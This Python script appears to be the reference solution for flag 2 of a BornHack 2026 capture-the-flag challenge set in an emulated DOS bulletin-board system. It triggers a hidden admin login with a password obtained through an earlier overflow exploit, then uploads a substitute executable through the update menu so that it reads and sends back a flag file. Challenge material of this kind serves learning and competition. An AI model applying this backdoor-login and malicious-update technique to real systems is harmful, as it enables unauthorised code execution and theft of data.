#!/usr/bin/env python3
"""
upload_flag2.py  --  VINDAASEN bornhack2026 flag-2 example
===========================================================

Uploads a custom VDLEV.EXE (VDFLG.EXE) via the BBS admin update menu.
VDLOVV loads it in place of the real VDLEV; it shuts VDLOVV down, takes
ownership of COM2, reads D:\\FLAG.TXT and sends it over the wire.
VINDAASEN's ReadUpdateResponse() echoes the COM3 traffic to the BBS
terminal for 10 s — that is where the flag arrives.

HOW TO BUILD VDFLG.EXE
-----------------------
Open the WIN3.0 VM, mount VDFLG/ as a drive (e.g. F:) and run BUILD.BAT:

    ./run.sh WIN3.0/win3.0.dosbox
    (inside DOSBox)
    mount F: C:\\<repo-root>\\VDFLG
    F:
    BUILD.BAT

The output VDFLG.EXE lands in VDFLG/ on the host.

USAGE
-----
    python3 upload_flag2.py VDFLG/VDFLG.EXE
    python3 upload_flag2.py VDFLG/VDFLG.EXE --password CTF{flag_1_here}
    python3 upload_flag2.py VDFLG/VDFLG.EXE --host localhost --port 2323

The admin password is the flag 1 value (obtained via the overflow exploit
or read from D:\\VINDAASEN.INI [Admin] Kodeord= on a running dosbox).

PREREQUISITES
-------------
Both dosbox instances running:
    ./run.sh win1.01-vindaasen.dosbox    (BBS on COM2 → TCP :2323)
    ./run.sh win1.01-vdlev.dosbox        (VDLOVV + VDLEV on fulfilment side)
"""

import argparse
import socket
import time


CP865      = "cp865"
CHUNK_SIZE = 16      # bytes per hex line; VDLOVV's HexLine handles up to 24


def recv_until(sock: socket.socket, sentinel: bytes,
               timeout: float = 20.0) -> bytes:
    sock.settimeout(timeout)
    buf = b""
    while sentinel not in buf:
        chunk = sock.recv(512)
        if not chunk:
            raise EOFError("connection closed before sentinel")
        buf += chunk
    return buf


def recv_for(sock: socket.socket, seconds: float) -> bytes:
    """Read everything arriving over the next `seconds` seconds."""
    sock.settimeout(1.0)
    buf = b""
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        try:
            chunk = sock.recv(512)
            if not chunk:
                break
            buf += chunk
        except socket.timeout:
            pass
    return buf


def upload(host: str, port: int, exe_path: str, password: str,
           chunk_size: int, line_delay: float) -> None:
    with open(exe_path, "rb") as f:
        exe_data = f.read()
    n_chunks = (len(exe_data) + chunk_size - 1) // chunk_size
    print(f"Loaded {len(exe_data)} bytes "
          f"({n_chunks} hex lines of {chunk_size} bytes each)")
    print()

    with socket.create_connection((host, port)) as sock:
        print(f"Connected to {host}:{port}")

        # ---- main BBS menu ----
        print("Waiting for main menu...", end=" ", flush=True)
        recv_until(sock, "Vælg:".encode(CP865))
        print("ok")

        # ---- 6x '*' to trigger hidden admin login ----
        print("Sending 6x '*' for admin login...", end=" ", flush=True)
        for _ in range(6):
            sock.sendall(b"*")
            time.sleep(0.05)
        recv_until(sock, b"Kodeord: ")
        print("got password prompt")

        # ---- send correct password ----
        print("Sending password...")
        sock.sendall(password.encode(CP865) + b"\r")

        # ---- wait for admin menu (look for 'O)' = part of 'O) Opdater...') ----
        recv_until(sock, b"O)")
        time.sleep(0.1)
        print("Admin menu received")

        # ---- select O) Opdater leverance-tjeneste ----
        print("Sending 'O' to start update...")
        sock.sendall(b"O")
        # Give BBS time to send OPDATER to COM3 and display the upload prompt
        time.sleep(1.5)

        # ---- stream hex-encoded EXE ----
        print(f"Uploading {n_chunks} lines", end="", flush=True)
        for i in range(0, len(exe_data), chunk_size):
            chunk = exe_data[i : i + chunk_size]
            line  = chunk.hex().upper().encode("ascii") + b"\r\n"
            sock.sendall(line)
            if line_delay > 0:
                time.sleep(line_delay)
            n = i // chunk_size + 1
            if n % 20 == 0:
                print(f" {n}/{n_chunks}", end="", flush=True)
        print(" done")

        # ---- Ctrl-D: BBS sends "EOT\r\n" to COM3 → VDLOVV loads VDFLG ----
        # Brief pause before EOT: VINDAASEN's LINK.C calls Com3Pump (TX FIFO
        # drain) only from Com3Send / LinkPoll, not from ReadUpdateResponse.
        # If the UART TX FIFO still holds the last hex chars when EOT is
        # processed, "EOT\r\n" queues in txbuf and won't drain until after
        # ReadUpdateResponse ends -- too late.  A 1.5 s gap ensures the
        # FIFO is empty (last char takes ≤8.3 ms at 1200 baud).
        time.sleep(1.5)
        print("Sending EOT (Ctrl-D)...")
        sock.sendall(b"\x04")

        # 1200 baud 8N1 = 120 chars/sec.  Budget:
        #   hex-drain time  : n_tcp_chars / 120
        #   EOT gap         : 1.5 s (added above)
        #   swap + VDFLG    : ~3 s overhead
        #   ReadUpdateResponse window: 10 s
        #   slack           : 5 s
        n_tcp_chars = n_chunks * (chunk_size * 2 + 2)   # hex chars + \r\n
        wait_secs   = int(n_tcp_chars / 120) + 25       # baud drain + margin
        print(f"Waiting up to {wait_secs} s "
              f"(~{int(n_tcp_chars/120)} s baud drain + 25 s margin)...",
              flush=True)
        response = recv_for(sock, wait_secs)

    if response:
        # Strip echoed '*' characters from the password entry prompt
        non_echo = bytes(b for b in response if b != ord("*"))
        print()
        print("--- Response ---")
        print(non_echo.decode(CP865, errors="replace"))
        print("--- end ---")
    else:
        print("No data received in the response window.")
        print("Check: both dosbox instances running, COM3 nullmodem connected.")


def main() -> None:
    p = argparse.ArgumentParser(
        description="VINDAASEN bornhack2026 flag-2 upload example",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Example:\n"
            "  python3 upload_flag2.py VDFLG/VDFLG.EXE\n"
            "  python3 upload_flag2.py VDFLG/VDFLG.EXE "
            "--password CTF{placeholder_flag_1}\n"
        ),
    )
    p.add_argument("exe", metavar="VDFLG.EXE",
                   help="path to the custom VDLEV.EXE to upload")
    p.add_argument("--host", default="localhost",
                   help="BBS TCP host (default: localhost)")
    p.add_argument("--port", type=int, default=2323,
                   help="BBS TCP port (default: 2323)")
    p.add_argument("--password", default="CTF{placeholder_flag_1}",
                   help="admin password (flag 1 value; default: placeholder)")
    p.add_argument("--chunk-size", type=int, default=CHUNK_SIZE,
                   dest="chunk_size",
                   help=f"bytes per hex line (default: {CHUNK_SIZE}, max: 24)")
    p.add_argument("--line-delay", type=float, default=0.0,
                   dest="line_delay",
                   help="pause between hex lines in seconds "
                        "(default: 0; use ~0.3 if bytes are dropped)")
    args = p.parse_args()

    print(f"Target  : {args.host}:{args.port}")
    print(f"EXE     : {args.exe}")
    print(f"Password: {args.password}")
    print()
    upload(args.host, args.port, args.exe, args.password,
           args.chunk_size, args.line_delay)


if __name__ == "__main__":
    main()
